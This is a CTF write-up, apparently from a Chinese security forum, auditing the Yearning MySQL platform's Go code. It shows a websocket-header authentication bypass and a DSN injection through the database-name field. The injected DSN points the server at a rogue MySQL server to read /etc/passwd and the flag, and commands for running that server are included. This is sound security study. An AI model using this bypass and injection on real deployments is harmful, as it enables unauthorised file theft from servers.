# 记一次golang的dsn注入之旅

> **来源**: https://forum.butian.net/share/2964  
> **文章ID**: 2964

---

0x01 前言
=======

d3ctf2024中的yearning-MYSQL审计平台的详细代码审计分析；

知识要点：`golang`代码审计+`dsn`注入+`rouge_mysql_server`使用

0x02 过程记录
=========

环境搭建
----

```php
# 前端项目地址  
https://github.com/cookieY/Yearning-gemini  
# 后端项目地址  
https://github.com/cookieY/Yearning  
​  
# 换源  
npm config set registry https://registry.npm.taobao.org  
npm config get registry  
\# 编译前端代码成dist  
npm install \--force  
npm install \-legacy-peer-deps  
npm run build  
# 移动到后端代码的service文件夹下面  
mv dist ../Yearning/src/service  
​  
# 后端  
go mod tidy  
go run main.go
```

记得`conf.toml`配置文件的host不能填本地回环地址，本地docker起的mysql数据库名字不是默认的，是`Yearning`：

![img](images/1714482209374-983ab43e-6240-45d2-a0ab-056ad3e5f102.png)

`goland`中的运行调试配置：

![img](images/1714482132627-eb77514e-951f-4971-8ff6-aefb1f45566b.png)

websocket相关
-----------

`Websocket协议`是对http的改进，可以实现client 与 server之间的双向通信； websocket连接一旦建立就始终保持，直到client或server 中断连接，弥补了http无法保持长连接的不足，方便了客户端应用与服务器之间实时通信。

适用场景： html页面实时更新, 客户端的html页面内，用`javascript` 与 `server` 建立`websocket`连接，实现页面内容的实时更新。Websocket 非常适合网页游戏、聊天、证券交易等实时应用。 要求保持长连接的实时通信的应用场景。 如基于位置的服务应用，物联网，多方协作软件，在线教育，带社交属性的手机APP等。

推荐使用`apifox`（<https://apifox.com/apiskills/how-to-use-websocket-in-python/>）进行`websocket`的请求，`python`的`websocket`库实在不敢恭维。?

代审分析
----

在`router.go`可以看到所有的路由，可以看到其中一些包含了鉴权操作：

![img](images/1714486152595-15213e95-6b32-4238-8bea-cca090bd7bd2.png)

然后发现`/api/v2`路由组中使用了一个`JWTWithConfig`中间件进行鉴权的操作，跟下去看看：

![img](images/1714487155402-7b64511e-d0f7-4d81-856c-8479bfd6ada9.png)

前面进行了一堆的`config`判断，然后最后发现有一个`return function`，判断如果是`websocket`请求，就直接返回。

![img](images/1714487326359-2f2f325a-80e7-46b1-a3a8-77431e51e7f1.png)

这边静态看不到这个`iswebsocket`函数具体内容是什么，给他打个断点，调试一下（可以访问<http://127.0.0.1:8000/api/v2/common/123>），发现是在依赖里面，我真是个哈皮，其中判断了`http`请求是否包含两个头部：

![img](images/1714487719370-8b25096f-3548-446c-a69a-fd3917e3b124.png)

需要满足`http`头部的内容是`Connection: upgrade` 和 `Upgrade: websocket`，这样就能直接return，看起来直接return就是绕过了鉴权。然后我们就能直接调用`/api/v2`下面所有的子路由。（发现好像调用`websocket`请求自带这两个头部。）

然后再fetch子路由找到一个`fetchtableinfo`函数，里面`u.FetchTableFieldsOrIndexes`

可以设置`dsn`的参数：

![img](images/1714490229492-e2e79441-2243-4902-b4cd-fcdefb3ecac8.png)

![img](images/1714490304396-143a3db5-ccb2-4fe9-bded-1905966bd7c3.png)

整了大半天，缘来是`bind函数`绑定的参数：

![img](images/1714541212232-b4a45b8e-785a-4490-b41c-3134f0fdb600.png)

直接用`apifox`这么发就行了，搞了半天`get`传参啊？：

![img](images/1714548013060-7434f9a5-45ed-4c53-9b79-38e827201acc.png)

**重点先说**：

1. 使`source_id`无效，则`model.DSN`其他字段置空；
2. 在`model.NewDBSub`函数中，实现`FormatDSN`拼接字符串，再ParseDSN解析成对象；
3. `FormatDSN`的时候是倒着解析的，解析到`/`+DBName的位置；
4. 综上，`DSN`完全可控，只要注入正确格式的`DSN`，就能用恶意的`server`进行恶意操作。

至于哪里有`dsn注入`呢，这里应该是`sourceid`可以让`DB`无效，然后`newdbsub`的时候会进行其他的操作：（注意，这里我们只能注入`DBName`，因为只有这里可控。）

![img](images/1714548664688-40ec78d6-8a7b-434c-934b-a9e92716d58c.png)

主要是`NewDBSub`中的`InitDSN`先进行了`formatDSN`操作（凭借成dsn字符串），然后在`drive.New`处进行了`parseDSN`操作（将dsn字符串解析成结构体变量。）：

![img](images/1714552766870-332ea741-d21b-4d94-a0ac-3adf14b14307.png)

先进行了`formatDSN`，就是将上述给的`json`配置转换为一个`DSN字符串`，牛；

![img](images/1714549766581-91aee870-03e1-44fc-a847-23de316a0b77.png)

![img](images/1714549785909-37909fea-c673-423b-91b1-d9a1037de5cb.png)

先写了**用户+密码**，然后写了**协议+地址**，然后**写了/+DBName数据库名**，然后**判断是否有参数传递**，然后我们其实可以在`mmsql`的`Config`看到所有参数的含义，是`go-sql-driver`的`mysql`驱动，其中，比较重要的就是要设置上面的`AllowAllFiles`为`true`，才能进行本地文件的加载，最后就是返回了这个`dsn`字符串

![img](images/1714550008794-b21fef84-a05f-41d7-87c0-cafa8f69fd88.png)

![img](images/1714550090840-0cebd9fc-a379-41b2-beac-f261f62f86de.png)

在`driver.New`才进行了`parseDSN`的操作，然后这个`DSN`就是前面`InitDSN`拼接的`dsn`字符串：

![img](images/1714552953924-0fe895f6-ade2-480e-81ea-4f21b88901fa.png)

![img](images/1714552923825-608f6fb6-c585-4d1c-8265-a298c742c823.png)

查看`parseDSN`的流程发现，他是倒着进行对整个`dsn字符串`进行遍历找寻`/符号`的，真牛哈哈哈哈；

那这样，前面的添加的一些`tcp(:0)`好像也没用了，因此前面我们通过对DBname的注入整个恶意的dsn的话，应该是可以达到预期效果的：

![img](images/1714554226252-07faaeb0-dd5e-4804-bc5a-37ef1b904411.png)

最终走到底部，解析出来的值设这样的（所以记得最后加个`&`，虽然账号密码没有被正常解析，但是`IP`地址解析正确了，所以应该可以进行注入攻击。）：

![img](images/1714554418095-e394b95d-ec77-4b40-b70c-7836ab6a7cbb.png)

攻击过程()
------

`websocket`地址：`ws://47.103.216.47:30546/api/v2/fetch/fields`

需要利用rmb122大哥的`rouge_mysql_server`项目进行攻击：

[https://github.com/rmb122/rogue\_mysql\_server](https://github.com/rmb122/rogue_mysql_server)

```php
\# 在当前目录下生成配置文件模版, 如果已有配置文件可以跳过这一步  
./rogue\_mysql\_server \-generate  
​  
​  
\# 运行服务器, 使用刚刚生成的 config.yaml  
./rogue\_mysql\_server  
​  
\# 或者手动指定配置路径  
./rogue\_mysql\_server \-config other\_config.yaml

**（注意IP地址要使用go-mysql-driver这边的格式：admin:123456@tcp(192.168.193.205:3307)/foo?allowAllFiles=true&**）用`apifox`这么发，就能读取到本地的文件了：
```

按照下面的格式进行发送请求攻击：  
![img](images/1714556546821-2dac5850-4a5b-479f-9685-1af0d2961fb4.png)

本地成功读取到/etc/passwd文件：

![img](images/1714556673029-ae132c69-0c4f-427c-9a90-c7dd4443cab6.png)

远程打一波(`ws://47.103.216.47:30546/api/v2/fetch/fields`)，记得**vps上面的端口要把安全组**打开，也是成功读取到了flag:

![img](images/1714557358699-db10e08e-dfd2-4215-a646-ac362208c307.png)

![img](images/1714557397477-48247ecf-f181-4fc5-bfc1-95c6cc17aa6d.png)

![img](images/1714557406564-b7438611-0df4-4a77-8494-027b6bec339b.png)

另一个漏洞点-sql盲注
------------

`FetchTableFieldsOrIndexes`函数的show这里进行了字符串拼接，所以明显可以存在SQL盲注，交给大哥们去分析了。

![img](images/1714556924691-3250903a-cdb9-433f-8a10-c456d4e44e1a.png)

0x03 总结
=======

学到了很多，熟悉了一波`golang`的语法和调试，以及`dsn`注入+`rouge_mysql_server`的利用。
